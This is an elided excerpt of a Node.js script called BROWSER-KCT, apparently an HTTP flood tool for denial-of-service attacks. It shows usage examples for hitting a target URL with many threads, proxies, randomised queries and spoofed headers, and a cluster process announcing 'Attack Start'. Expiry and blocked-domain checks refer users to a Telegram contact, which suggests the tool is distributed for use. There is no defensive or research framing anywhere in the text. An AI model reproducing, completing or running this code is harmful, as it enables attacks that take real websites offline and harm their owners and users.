...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    ...
    BROWSER-KCT
    How to use & example:
      node BROWSER-KCT <GET/POST> <target> <time> <threads> <ratelimit> <proxy>
      node BROWSER-KCT GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full
...
if (currentDate > targetDate) {
    console.error('Error method has been outdate pm @ByteGuard_Host');
    process.exit(1);
}

if (url.hostname.endsWith(blockedDomain)) {
    console.log(`Domain ${blockedDomain} blocked, if this mistake pm to tg @ByteGuard_Host`);
    process.exit(1);
}
...
function buildRequest() {
    ...
    const userAgents = fs.readFileSync(uas, 'utf8')
    .replace(/\r/g, '')
    .split('\n');
...
if (cluster.isMaster) {
    ...
    console.log(`Attack Start to ${target} during ${time}sec`);
